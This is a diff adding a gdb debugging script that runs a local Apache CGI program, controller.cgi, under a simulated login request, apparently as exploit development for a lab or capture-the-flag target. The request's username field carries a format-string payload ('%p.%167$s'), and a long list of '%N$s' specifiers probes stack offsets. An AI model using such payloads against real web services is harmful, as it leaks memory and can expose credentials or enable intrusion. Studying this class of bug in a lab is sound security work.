@@ -1,0 +1,52 @@
+
+gdb -q /usr/local/apache2/cgi-bin/controller.cgi \
+  -ex 'set disassemble-next-line on' \
+  -ex 'set pagination off' \
+  -ex 'set follow-fork-mode parent' \
+  -ex 'set disable-randomization on' \
+  \
+  -ex 'set env SERVER_SOFTWARE Apache/2.4.65 (Unix)' \
+  -ex 'set env SERVER_NAME localhost' \
+  -ex 'set env SERVER_ADDR 172.19.0.2' \
+  -ex 'set env SERVER_PORT 8089' \
+  -ex 'set env GATEWAY_INTERFACE CGI/1.1' \
+  -ex 'set env SERVER_PROTOCOL HTTP/1.1' \
+  -ex 'set env REQUEST_METHOD GET' \
+  -ex 'set env REQUEST_SCHEME http' \
+  -ex 'set env DOCUMENT_ROOT /usr/local/apache2/htdocs' \
+  -ex 'set env CONTEXT_PREFIX /cgi-bin/' \
+  -ex 'set env CONTEXT_DOCUMENT_ROOT /usr/local/apache2/cgi-bin/' \
+  -ex 'set env SERVER_ADMIN you@example.com' \
+  -ex 'set env SCRIPT_NAME /cgi-bin/controller.cgi' \
+  -ex 'set env SCRIPT_FILENAME /usr/local/apache2/cgi-bin/controller.cgi' \
+  -ex 'set env REMOTE_ADDR 172.19.0.1' \
+  -ex 'set env REMOTE_PORT 46320' \
+  -ex 'set env REQUEST_URI /cgi-bin/controller.cgi?action=login' \
+  -ex 'set env HTTP_HOST localhost:8089' \
+  -ex 'set env HTTP_CONNECTION keep-alive' \
+  -ex 'set env HTTP_SEC_CH_UA "Chromium";v="140", "Not=A?Brand";v="24", "Brave";v="140"' \
+  -ex 'set env HTTP_SEC_CH_UA_MOBILE ?0' \
+  -ex 'set env HTTP_SEC_CH_UA_PLATFORM "Windows"' \
+  -ex 'set env HTTP_UPGRADE_INSECURE_REQUESTS 1' \
+  -ex 'set env HTTP_USER_AGENT Mozilla/5.0\ (Windows\ NT\ 10.0;\ Win64;\ x64)\ AppleWebKit/537.36\ (KHTML,\ like\ Gecko)\ Chrome/140.0.0.0\ Safari/537.36' \
+  -ex 'set env HTTP_ACCEPT text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
+  -ex 'set env HTTP_SEC_GPC 1' \
+  -ex 'set env HTTP_ACCEPT_LANGUAGE en-US,en;q=0.9' \
+  -ex 'set env HTTP_SEC_FETCH_SITE same-origin' \
+  -ex 'set env HTTP_SEC_FETCH_MODE navigate' \
+  -ex 'set env HTTP_SEC_FETCH_USER ?1' \
+  -ex 'set env HTTP_SEC_FETCH_DEST document' \
+  -ex 'set env HTTP_REFERER http://localhost:8089/login.html' \
+  -ex 'set env HTTP_ACCEPT_ENCODING gzip,\ deflate,\ br,\ zstd' \
+  -ex 'set env PATH /usr/local/apache2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' \
+  \
+  -ex 'set env QUERY_STRING action=login&username=%25p.%25167$s'
+
+
+
+b*_dl_start_user+50
+b*__libc_start_call_main+118
+p&login
+%167$s
+
+%140$s%141$s%142$s%143$s%144$s%145$s%146$s%147$s%148$s%149$s%150$s%151$s%152$s%153$s%154$s%155$s%156$s%157$s%158$s%159$s%160$s%161$s%162$s%163$s%164$s%165$s%166$s%167$s%168$s%169$s%170$s%171$s%172$s%173$s%174$s%175$s
